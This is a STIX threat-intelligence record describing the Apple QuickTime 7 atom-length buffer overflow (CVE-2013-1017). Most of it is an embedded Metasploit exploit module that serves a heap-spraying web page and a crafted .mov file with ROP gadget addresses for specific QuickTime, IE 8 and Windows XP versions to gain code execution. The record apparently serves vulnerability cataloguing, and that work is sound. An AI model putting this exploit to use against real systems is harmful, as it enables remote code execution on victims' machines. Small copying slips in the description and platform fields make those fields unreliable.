{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--ec503318-2be5-4283-a710-e8fb21fc958b",
    "created": "2024-08-14T16:41:21.926249Z",
    "modified": "2024-08-14T16:41:21.926253Z",
    "name": "\"Apple Quicktime 7 Invalid Atom Length Buffer Overflow\"",
    "description": " This module exploits a vulnerability found in Apple Quicktime. The flaw is triggered when Quicktime fails to properly handle the data length for certain atoms such as 'rdrf' or 'dref' in the Alis record, which may result a buffer overflow by loading a specially crafted .mov file, and allows arbitrary code execution under the context of the current user.  'License'        => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/browser/apple_quicktime_rdrf.rb",
            "external_id": "apple_quicktime_rdrf.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2013-1017"
        },
        {
            "source_name": "reference",
            "url": "http://support.apple.com/kb/HT5770"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = NormalRanking\n\n  include Msf::Exploit::Remote::HttpServer::HTML\n  include Msf::Exploit::RopDb\n\n  def initialize(info={})\n    super(update_info(info,\n      'Name'           => \"Apple Quicktime 7 Invalid Atom Length Buffer Overflow\",\n      'Description'    => %q{\n        This module exploits a vulnerability found in Apple Quicktime. The flaw is\n        triggered when Quicktime fails to properly handle the data length for certain\n        atoms such as 'rdrf' or 'dref' in the Alis record, which may result a buffer\n        overflow by loading a specially crafted .mov file, and allows arbitrary\n        code execution under the context of the current user.\n      },\n      'License'        => MSF_LICENSE,\n      'Author'         =>\n        [\n          'Jason Kratzer', # Original Discovery & PoC (overlapped finding), aka pyoor\n          'Tom Gallagher', # Original Discovery (overlapped)\n          'Paul Bates',    # Original Discovery (overlapped)\n          'sinn3r'         # Metasploit\n        ],\n      'References'     =>\n        [\n          [ 'CVE', '2013-1017' ],\n          [ 'OSVDB', '93625' ],\n          [ 'BID', '60097' ],\n          [ 'URL', 'http://support.apple.com/kb/HT5770' ],\n          [ 'ZDI', '13-110' ]\n        ],\n      'Platform'       => 'win',\n      'Targets'        =>\n        [\n          # All of the following addresses are from Quicktime.qts\n          # RET = ADD ESP,280; RET, Nop = RET, Pop = POP ESP; RET\n          [ 'Quicktime 7.7.3 with IE 8 on Windows XP SP3', {'Ret' => 0x66923467, 'Nop' => 0x6692346d, 'Pop' => 0x66849239} ],\n          [ 'Quicktime 7.7.2 with IE 8 on Windows XP SP3', {'Ret' => 0x669211C7, 'Nop' => 0x669211CD, 'Pop' => 0x668C5B55} ],\n          [ 'Quicktime 7.7.1 with IE 8 on Windows XP SP3', {'Ret' => 0x66920D67, 'Nop' => 0x66920D6D, 'Pop' => 0x66849259} ],\n          [ 'Quicktime 7.7.0 with IE 8 on Windows XP SP3', {'Ret' => 0x66920BD7, 'Nop' => 0x66920BDD, 'Pop' => 0x668E963A} ]\n        ],\n      'Payload'        =>\n        {\n          'BadChars'        => \"\\x00\"  # js_property_spray no like nilz\n        },\n      'DefaultOptions'  =>\n        {\n          'InitialAutoRunScript' => 'post/windows/manage/priv_migrate'\n        },\n      'Privileged'     => false,\n      'DisclosureDate' => '2013-05-22'\n    ))\n  end\n\n  def get_payload(t)\n    alignment = \"\\x81\\xc4\\x54\\xf2\\xff\\xff\" # Stack adjustment # add esp, -3500\n    p = generate_rop_payload('msvcrt', alignment + payload.encoded, {'target'=>'xp'})\n    return p\n  end\n\n\n  def targetable?(agent)\n    if agent =~ /MSIE 8\\.0/ and agent =~ /Windows NT 5\\.1/\n      return true\n    elsif agent =~ /contype/\n      # contype: a mov file request from Apple Quicktime\n      return true\n    end\n\n    false\n  end\n\n\n  def get_html(t)\n    js_p = ::Rex::Text.to_unescape(get_payload(t), ::Rex::Arch.endian(t.arch))\n    fake_mov_name = rand_text_alpha(4) + \".mov\"\n    html = %Q|\n    <html>\n    <head>\n    <script>\n    #{js_property_spray}\n\n    var s = unescape(\"#{js_p}\");\n    sprayHeap({shellcode:s});\n    </script>\n    </head>\n    <body>\n    <embed src=\"#{get_resource}/#{fake_mov_name}\" width=\"0\" height=\"0\"></embed>\n    </body>\n    </html>\n    |\n\n    html.gsub(/^ {4}/, '')\n  end\n\n\n  def on_request_uri(cli, request)\n    agent = request.headers['User-Agent']\n    print_status(\"Requesting: #{request.uri}\")\n\n    unless targetable?(agent)\n      print_error(\"Browser not supported, sending 404: #{agent}\")\n      send_not_found(cli)\n      return\n    end\n\n    print_status(\"Target selected as: #{target.name}\") if target\n\n    if request.uri =~ /\\.mov$/\n      print_status(\"Sending specially crafted .mov file\")\n      send_response(cli, @exploit, { 'Content-Type' => 'application/octet-stream' })\n    else\n      html = get_html(target)\n      send_response(cli, html, { 'Content-Type'=>'text/html', 'Cache-Control'=>'no-cache' })\n    end\n  end\n\n  def sort_bytes(data)\n    data.map { |e| [e].pack('N').scan(/../).reverse.join }.join\n  end\n\n  def rop_nop(t)\n    [t['Nop']].pack('V*')                    # Ret (QuickTime.qts)\n  end\n\n  def exploit\n    buf = ''\n    buf << rand_text_alpha(467)              # 467 to align the pivot\n    10.times {\n      buf << rop_nop(target)\n    }\n    buf << [\n      target['Pop'],                       # POP ESP; RET (QuickTime.qts)\n      0x20302020                           # Target value for ESP (our ROP payload)\n    ].pack('V*')\n    buf << rand_text_alpha(611 - buf.length) # Offset 611 to hit SE Handler\n    buf << sort_bytes([target.ret])          # ADD ESP,280; RET (QuickTime.qts) - pivot\n    buf << rand_text_alpha(658 - buf.length) # 658 bytes to pad up the mov file size\n\n    # Quicktime File Format Specifications:\n    # https://developer.apple.com/standards/qtff-2001.pdf\n    mov  = \"\\x00\\x00\\x06\\xDF\"                # File size\n    mov << \"moov\"                            # Movie atom\n    mov << \"\\x00\\x00\\x06\\xD7\"                # size (1751d)\n    mov << \"rmra\"                            # Reference Movie atom\n    mov << \"\\x00\\x00\\x06\\xCF\"                # size (1743d)\n    mov << \"rmda\"                            # rmda atom\n    mov << \"\\x00\\x00\\x06\\xBF\"                # size (1727d)\n    mov << \"rdrf\"                            # Data reference atom\n    mov << \"\\x00\\x00\\x00\\x00\"                # size set to 0\n    mov << \"alis\"                            # Data reference type: FS alias record\n    mov << \"\\x00\\x00\\x06\\xAA\"                # Size (1706d)\n    mov << rand_text_alpha(8)\n    mov << \"\\x00\\x00\\x06\\x61\"                # Size (1633d)\n    mov << rand_text_alpha(38)\n    mov << \"\\x12\"\n    mov << rand_text_alpha(81)\n    mov << \"\\xFF\\xFF\"\n    mov << rand_text_alpha(18)\n    mov << \"\\x00\\x08\"                        # Size (8d)\n    mov << rand_text_alpha(8)\n    mov << \"\\x00\\x00\"\n    mov << \"\\x00\\x08\"                        # Size (8d)\n    mov << rand_text_alpha(8)\n    mov << \"\\x00\\x00\"\n    mov << \"\\x00\\x26\"                        # Size (38d)\n    mov << rand_text_alpha(38)\n    mov << \"\\x00\\x0F\\x00\\x0E\"\n    mov << \"AA\"                              # Size (must be invalid)\n    mov << rand_text_alpha(12)\n    mov << \"\\x00\\x12\\x00\\x21\"\n    mov << rand_text_alpha(36)\n    mov << \"\\x00\"\n    mov << \"\\x0F\\x33\"\n    mov << rand_text_alpha(17)\n    mov << \"\\x02\\xF4\"                        # Size (756h)\n    mov << rand_text_alpha(756)\n    mov << \"\\xFF\\xFF\\x00\\x00\\x00\"\n    mov << buf\n\n    @exploit = mov\n    super\n  end\nend\n",
    "x_mitre_disclosure_date": "2013-05-22",
    "x_mitre_platforms": [
        "win'"
    ]
}